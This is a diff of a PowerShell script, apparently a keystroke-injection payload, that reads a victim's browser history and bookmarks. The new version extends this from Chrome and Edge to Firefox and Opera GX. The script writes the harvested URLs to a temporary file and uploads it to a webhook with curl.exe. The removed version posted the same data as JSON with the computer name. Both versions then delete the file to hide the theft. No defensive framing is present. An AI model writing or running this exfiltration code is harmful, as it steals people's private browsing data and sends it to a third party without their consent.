@@ -4,25 +4,43 @@ $whuri = "$dc"
 #==================================================================
 
 $outpath = "$env:temp\history.txt"
-$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
-$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
-$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
-
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII
-"Google Chrome `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Microsoft Edge `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 
-Write-Output "File Saved To > $env:temp/history.txt"
+# Define the Regular expression for extracting history and bookmarks
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-$Pathsys = "$env:temp\history.txt"
-$msgsys = Get-Content -Path $Pathsys -Raw 
-$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
-Start-Sleep 1
-Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
-Remove-Item -Path $Pathsys -force
+# Define paths for data storage
+$Paths = @{
+    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
+    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
+    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
+    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
+    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+}
+
+# Define browsers and data
+$Browsers = @('chrome', 'edge', 'firefox', 'opera')
+$DataValues = @('history', 'bookmarks')
+
+foreach ($Browser in $Browsers) {
+    foreach ($DataValue in $DataValues) {
+        $PathKey = "${Browser}_${DataValue}"
+        $Path = $Paths[$PathKey]
+
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
+
+        $Value | ForEach-Object {
+            [PSCustomObject]@{
+                Browser  = $Browser
+                DataType = $DataValue
+                Content = $_
+            }
+        } | Out-File -FilePath $outpath -Append
+    }
+}
+
+curl.exe -F file1=@"$outPath" $whuri | Out-Null
+sleep 2
+Remove-Item -Path $outPath -force
